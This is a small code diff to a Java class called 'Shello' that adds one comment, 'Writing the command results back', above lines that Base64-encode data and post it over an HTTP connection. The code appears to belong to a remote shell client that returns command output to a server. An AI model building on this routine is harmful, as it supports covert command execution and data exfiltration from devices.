@@ -44,6 +44,7 @@ public class Shello {
                 postDataBytes=Base64.encode(postDataBytes,Base64.DEFAULT);
                 urlConnection.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
 
+                //Writing the command results back
                 DataOutputStream wr = new DataOutputStream(urlConnection.getOutputStream());
                 wr.write(postDataBytes);
 
